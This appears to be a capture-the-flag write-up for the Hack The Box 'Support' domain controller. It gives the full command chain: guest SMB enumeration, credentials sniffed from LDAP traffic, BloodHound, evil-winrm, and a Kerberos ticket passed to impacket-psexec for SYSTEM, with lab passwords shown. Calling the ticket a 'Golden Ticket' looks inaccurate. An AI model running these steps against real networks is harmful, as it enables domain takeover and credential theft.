# Enumeration

## NMAP Scan

```
# Nmap 7.99 scan initiated Thu Jul  2 02:27:31 2026 as: /usr/lib/nmap/nmap -sC -sV --reason -oA support 10.129.10.66
Nmap scan report for 10.129.10.66
Host is up, received echo-reply ttl 127 (0.099s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-07-02 06:27:47Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-02T06:28:00
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul  2 02:28:46 2026 -- 1 IP address (1 host up) scanned in 75.10 seconds
```

`support.htb` is the name of the domain

## SMB Share Enumeration with NXC

We don't have any credentials given to us with this box, so we will try Guest authentication

```
┌──(kali㉿kali)-[~/htb/support]
└─$ nxc smb support.htb -u '.' -p '' --shares                              
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.181  445    DC               [+] support.htb\.: (Guest)
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions     Remark
SMB         10.129.230.181  445    DC               -----           -----------     ------
SMB         10.129.230.181  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.181  445    DC               C$                              Default share
SMB         10.129.230.181  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON                        Logon server share 
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
SMB         10.129.230.181  445    DC               SYSVOL                          Logon server share
```

The `support-tools` share is readable by Guest.

## Reading readable share with SMBClient

```
┌──(kali㉿kali)-[~/htb/support]                                                                                                         
└─$ smbclient '//support.htb/support-tools' -U Guest                                                                                    
Password for [WORKGROUP\Guest]:                                                                                                         
Try "help" to get a list of possible commands.                                                                                          
smb: \> dir                                                                                                                             
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
```

Out of all these, only `UserInfo.exe.zip` sticks out, it has a different date stamp on it, and it also does not seem similar to other applications

We will download this, and extract it on our machine.

```
┌──(kali㉿kali)-[~/htb/support/userinfo]
└─$ file UserInfo.exe
UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
```

`UserInfo.exe` is a Mono/.Net assembly executable

```
NOTE: In order to execute it on a linux machine, few packages are needed. Those packages are powershell, dotnet-sdk, dotnet-runtime, mono-complete
```

# Foothold
## Executing UserInfo.exe

```
┌──(kali㉿kali)-[~/htb/support/userinfo]
└─$ mono ./UserInfo.exe                           

Usage: UserInfo.exe [options] [commands]

Options: 
  -v|--verbose        Verbose output                                    

Commands: 
  find                Find a user                                       
  user                Get information about a user
```

```
┌──(kali㉿kali)-[~/htb/support/userinfo]
└─$ mono ./UserInfo.exe -v find -first kratos
[*] LDAP query to use: (givenName=kratos)
[-] Exception: No Such Object
```

Judging by all the file contents, I assumed this exe file was calling to its LDAP server whenever executed, in order to check whether the user `kratos` existed.

I can monitor this network traffic with Wireshark

### Important Steps

1. If `support.htb` has NOT been added into `/etc/hosts` files, then in wireshark, under `eth0` network adapter, if the `DNS` filter is applied, then we can see DNS traffic going to `support.htb`. This is because since the domain has not been added into the hosts files, `UserInfo.exe` is attempting to resolve the domain itself by calling to support.htb
2. If `support.htb` has been added, then in wireshark, there will be no DNS traffic in `eth0` adapter since the domain is already resolved and the executable file will directly talk with the box, and the box will send LDAP network traffic on `tun0` interface.
3. This LDAP traffic has credentials for a user named `ldap@support.htb`. By right clicking on it, and selecting `follow stream`, we see the creds.
![[Pasted image 20260703114937.png]]

`ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

These creds allow us to authenticate under `LDAP` and `SMB`

## Find all attributes of ldap user

```
nxc ldap support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --query "(objectClass=user)" ""
```

This command gives us all the attributes of all users on this box

When we look under the `info` attribute of ldap user, we find a password `Ironside47pleasure40Watchful`

This means that `ldap` user is most likely a shared account, and a lot of times in Active Directory environments, the passwords for shared accounts are stored, either in the `description` field or `info` field.

## Using bloodhound-python to collect data

```
bloodhound-python -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -ns 10.129.230.181 -d support.htb -c All
```

This gives us all the bloodhound data we need

I ran the cypher query for `Shortest path to Domain Admins`, and one account stuck out to me, which was `support@support.htb`, which was the one of the only non-default accounts I found.

I tried `Ironside47pleasure40Watchful` on it and it worked.

## Getting WinRM as support user

```
nxc winrm support.htb -u support -p 'Ironside47pleasure40Watchful'
```

This confirmed that I got WinRM access

```
evil-winrm -i dc.support.htb -u 'support' -p 'Ironside47pleasure40Watchful'
```

The user flag was found in `C:\User\support\Desktop`

# Privilege Escalation

![[Pasted image 20260703124728.png]]

Support User was a member of `Shared Support Accounts`, which had `GenericAll` over DC.SUPPORT.HTB

I imported PowerView.ps1, Powermad.ps1, and Rubeus.exe to the compromised machine

![[Pasted image 20260703125520.png]]

Followed these commands which Bloodhound gave
Got a Golden Ticket and then I did `Pass-the-ticket` attack

## Pass-The-Ticket attack

I got a ticket in base64 encoded form, so I decoded it, and used `impacket-ticketconverter` to convert it from `ticket.kirbi` to `ticket.ccache`

```
KRB5CCNAME=ticket.ccache impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb
```

I ran this command to pass the ticket to `impacket-psexec`, using KRB5CCNAME environment variable
I got a shell as `nt authority/system`

The root flag was in `C:\User\Administrator\Desktop`

